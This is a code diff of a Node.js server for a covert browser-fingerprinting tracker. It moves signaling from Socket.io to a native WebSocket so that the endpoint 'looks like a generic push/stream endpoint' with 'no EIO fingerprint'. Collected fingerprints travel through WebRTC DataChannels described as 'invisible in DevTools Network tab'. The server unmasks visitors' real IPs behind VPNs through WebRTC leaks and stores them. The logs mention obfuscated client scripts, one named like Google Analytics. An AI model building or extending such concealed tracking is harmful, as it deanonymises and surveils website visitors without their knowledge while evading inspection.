@@ -8,7 +8,7 @@ const cors       = require('cors')
 const helmet     = require('helmet')
 const rateLimit  = require('express-rate-limit')
 const cookieParser = require('cookie-parser')
-const { Server: SocketServer } = require('socket.io')
+const { WebSocketServer } = require('ws')
 const dc         = require('node-datachannel')
 const db         = require('./db')
 
@@ -16,10 +16,8 @@ dc.initLogger('Fatal', () => {}) // suppress verbose datachannel logs
 
 const app        = express()
 const httpServer = http.createServer(app)
-const io         = new SocketServer(httpServer, {
-  path: '/api/v1/events/',          // disguised — looks like analytics endpoint
-  cors: { origin: '*', methods: ['GET', 'POST'] }
-})
+// Native WebSocket — no socket.io EIO fingerprint in URL
+const wss        = new WebSocketServer({ noServer: true })
 const PORT = parseInt(process.env.PORT, 10) || 3000
 
 // Trust reverse proxy for X-Forwarded-* headers (required on Render)
@@ -439,18 +437,21 @@ async function startServer() {
   await db.init();
   const maskedKey = API_KEY ? (API_KEY.length > 8 ? `${API_KEY.slice(0, 4)}...${API_KEY.slice(-4)}` : '****') : 'none';
 
-  // ── WebRTC DataChannel Signaling via Socket.io ────────────────────────────
-  // All collect and crypto/public-key traffic is tunneled inside
-  // WebRTC DataChannels — completely invisible in DevTools Network tab.
-  io.on('connection', (socket) => {
-    // node-datachannel uses {hostname, port, relayType} — NOT browser-style urls:[...]
+  // ── WebRTC DataChannel Signaling via native WebSocket ────────────────────
+  // Path: /ws/push — looks like a generic push/stream endpoint, no EIO fingerprint
+  // All collect and public-key traffic is tunneled inside DTLS-encrypted DataChannel
+  httpServer.on('upgrade', (request, socket, head) => {
+    const { pathname } = new URL(request.url, 'https://x');
+    if (pathname !== '/ws/push') { socket.destroy(); return; }
+    wss.handleUpgrade(request, socket, head, (ws) => wss.emit('connection', ws, request));
+  });
+
+  wss.on('connection', (ws, request) => {
     const turnUser = process.env.TURN_USERNAME || '';
     const turnPass = process.env.TURN_PASSWORD || '';
     const turnServers = (turnUser && turnPass) ? [
       { hostname: 'global.relay.metered.ca', port: 80,  username: turnUser, password: turnPass, relayType: 'TurnUdp' },
-      { hostname: 'global.relay.metered.ca', port: 80,  username: turnUser, password: turnPass, relayType: 'TurnTcp' },
-      { hostname: 'global.relay.metered.ca', port: 443, username: turnUser, password: turnPass, relayType: 'TurnTcp' },
-      { hostname: 'global.relay.metered.ca', port: 443, username: turnUser, password: turnPass, relayType: 'TurnTls' }
+      { hostname: 'global.relay.metered.ca', port: 3478, username: turnUser, password: turnPass, relayType: 'TurnUdp' }
     ] : [];
     const peer = new dc.PeerConnection('server', {
       iceServers: [
@@ -459,27 +460,24 @@ async function startServer() {
       ]
     });
 
-    peer.onLocalDescription((sdp, type) => socket.emit('answer', { sdp, type }));
-    peer.onLocalCandidate((candidate, mid) => socket.emit('candidate', { candidate, mid }));
+    const send = (obj) => { try { ws.send(JSON.stringify(obj)); } catch(e) {} };
+
+    peer.onLocalDescription((sdp, type) => send({ t: 'a', sdp, type }));
+    peer.onLocalCandidate((candidate, mid) => send({ t: 'c', candidate, mid }));
 
     peer.onDataChannel((channel) => {
       channel.onMessage(async (rawMsg) => {
         let req;
         try { req = JSON.parse(rawMsg.toString()); } catch { return; }
 
-        // Route 1: Browser requests the RSA public key
         if (req.type === 'getPublicKey') {
           channel.sendMessage(JSON.stringify({
-            type: 'publicKey',
-            keyId: rsaKeyId,
-            version: '1.0',
-            algorithm: 'RSA-OAEP-SHA256',
-            publicKey: spkiBase64
+            type: 'publicKey', keyId: rsaKeyId, version: '1.0',
+            algorithm: 'RSA-OAEP-SHA256', publicKey: spkiBase64
           }));
           return;
         }
 
-        // Route 2: Browser sends encrypted fingerprint payload
         if (req.type === 'collect') {
           const env = req.payload;
           if (!env || env.version !== '1.0' || env.keyId !== rsaKeyId ||
@@ -487,13 +485,11 @@ async function startServer() {
             channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Invalid payload' }));
             return;
           }
-
           const msgTime = parseInt(env.ts, 10);
           if (isNaN(msgTime) || Date.now() - msgTime > 5 * 60 * 1000 || msgTime > Date.now() + 60000) {
             channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Expired' }));
             return;
           }
-
           try {
             await db.insertNonce(env.nonce, Date.now() + (60 * 60 * 1000));
           } catch (err) {
@@ -503,7 +499,6 @@ async function startServer() {
             }
             throw err;
           }
-
           let decryptedBody;
           try {
             const iv = Buffer.from(env.iv, 'base64url');
@@ -524,19 +519,18 @@ async function startServer() {
             channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Decryption failed' }));
             return;
           }
-
-          // Geo / VPN detection (same logic as HTTP /collect)
-          const httpIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim() || socket.handshake.address || '';
+          const httpIp = (request.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+                         request.socket?.remoteAddress || '';
           let isVpn = false, vpnReasons = [];
           const resolved_ips = [];
           if (decryptedBody.rtc) {
             const srflxIps = decryptedBody.rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]);
-            const hostIps = decryptedBody.rtc.filter(i => i.includes('host'));
+            const hostIps  = decryptedBody.rtc.filter(i => i.includes('host'));
             if (srflxIps.length > 0 && !srflxIps.includes(httpIp) && httpIp !== '::1' && httpIp !== '127.0.0.1') {
               isVpn = true; vpnReasons.push('WebRTC Bypass: true IP leaked');
             }
             if (srflxIps.length > 1) { isVpn = true; vpnReasons.push('Multi-Routing detected'); }
-            if (hostIps.length > 1)  { isVpn = true; vpnReasons.push('Adapter Anomaly'); }
+            if (hostIps.length  > 1) { isVpn = true; vpnReasons.push('Adapter Anomaly'); }
             if (decryptedBody.rtc.length === 0) { isVpn = true; vpnReasons.push('WebRTC Blocked'); }
           }
           try {
@@ -558,19 +552,17 @@ async function startServer() {
               decryptedBody.rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]).forEach(ip => resolveIp(ip, 'srflx'));
             }
           } catch(e) {}
-
           const entry = {
             id: crypto.randomBytes(8).toString('hex'),
             timestamp: new Date().toISOString(),
             ip: httpIp,
-            userAgent: socket.handshake.headers['user-agent'] || '',
-            referer: socket.handshake.headers['referer'] || '',
+            userAgent: request.headers['user-agent'] || '',
+            referer: request.headers['referer'] || '',
             vpn_leak: { detected: isVpn, reasons: [...new Set(vpnReasons)] },
             ip_addresses: resolved_ips,
             data: decryptedBody,
             transport: 'webrtc'
           };
-
           await db.insertFingerprint(
             entry.id, entry.timestamp, entry.ip, entry.userAgent, entry.referer,
             entry.vpn_leak, entry.ip_addresses, entry.data
@@ -581,15 +573,12 @@ async function startServer() {
       });
     });
 
-    socket.on('offer', ({ sdp, type }) => {
-      try { peer.setRemoteDescription(sdp, type); } catch(e) {}
+    ws.on('message', (data) => {
+      let msg; try { msg = JSON.parse(data); } catch { return; }
+      if (msg.t === 'o') { try { peer.setRemoteDescription(msg.sdp, msg.type); } catch(e) {} }
+      if (msg.t === 'c') { try { peer.addRemoteCandidate(msg.candidate, msg.mid); } catch(e) {} }
     });
-    socket.on('candidate', ({ candidate, mid }) => {
-      try { peer.addRemoteCandidate(candidate, mid); } catch(e) {}
-    });
-    socket.on('disconnect', () => {
-      try { peer.close(); } catch(e) {}
-    });
+    ws.on('close', () => { try { peer.close(); } catch(e) {} });
   });
 
   httpServer.listen(PORT, '0.0.0.0', () => {
@@ -601,7 +590,7 @@ async function startServer() {
     console.log(`  📡  Gateway   : http://0.0.0.0:${PORT}/`)
     console.log(`  📊  Dashboard : http://0.0.0.0:${PORT}/dashboard (Login required)`)
     console.log(`  💚  Health    : http://0.0.0.0:${PORT}/health`)
-    console.log(`  📡  WebRTC    : Socket.io signaling active`)
+    console.log(`  📡  WebRTC    : native WebSocket /ws/push (no EIO fingerprint)`)
     console.log('─'.repeat(64))
     console.log('  🔒  ga.min.js → base64 string-array obfuscated')
     console.log('  🔒  t.js      → RC4 + control-flow + debug-protection')
